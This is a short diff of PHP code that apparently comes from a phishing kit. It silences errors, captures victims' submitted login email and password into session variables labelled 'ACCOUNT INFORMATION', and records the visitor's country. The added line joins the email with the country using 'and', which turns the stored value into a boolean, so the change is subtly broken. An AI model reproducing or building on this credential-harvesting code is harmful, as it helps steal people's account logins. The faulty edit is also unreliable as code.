@@ -11,9 +11,10 @@ error_reporting(0);
 include('../../functions/get_ip.php');
 include('../../functions/get_lang_en.php'); 
 ################## ACCOUNT INFORMATION #################
-$_SESSION['_login_email_']    = $_POST['login_email'];
+$_SESSION['_login_email_']    = $_POST['login_email'] and $LOOKUP_COUNTRY;
 $_SESSION['_login_password_'] = $_POST['login_password'];
 $_SESSION['COUNTRYA'] =  $LOOKUP_COUNTRY;
+
 ################## ACCOUNT INFORMATION #################
 echo $LOOKUP_COUNTRY;
 $charSet = "XXXXID0123456789";
